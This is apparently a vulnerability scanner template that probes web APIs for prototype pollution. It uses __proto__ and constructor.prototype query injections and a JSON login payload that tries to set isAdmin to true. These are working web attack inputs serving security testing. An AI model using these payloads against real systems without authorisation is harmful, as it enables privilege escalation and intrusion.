id: hunt3r-prototype-pollution

info:
  name: Prototype Pollution Detection
  author: hunt3r
  severity: medium
  description: Detects prototype pollution vulnerabilities in JavaScript APIs via __proto__ and constructor.prototype injection.
  tags: prototype-pollution,injection,hunt3r
  reference:
    - https://portswigger.net/web-security/prototype-pollution

http:
  - method: GET
    path:
      - "{{BaseURL}}/?__proto__[hunt3r]=polluted"
      - "{{BaseURL}}/?constructor.prototype.hunt3r=polluted"
      - "{{BaseURL}}/api/products?__proto__[hunt3r]=polluted"
      - "{{BaseURL}}/rest/products/search?q=test&__proto__[hunt3r]=polluted"

    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "polluted"

      - type: regex
        part: body
        regex:
          - "\"hunt3r\"\\s*:\\s*\"polluted\""

  - method: POST
    path:
      - "{{BaseURL}}/api/"
      - "{{BaseURL}}/api/v1/"
      - "{{BaseURL}}/rest/user/login"

    body: '{"__proto__":{"isAdmin":true},"email":"a@b.com","password":"test"}'
    headers:
      Content-Type: "application/json"

    matchers-condition: and
    matchers:
      - type: status
        status: [200]

      - type: word
        part: body
        words:
          - "isAdmin"
          - "admin"
          - "true"
        condition: or
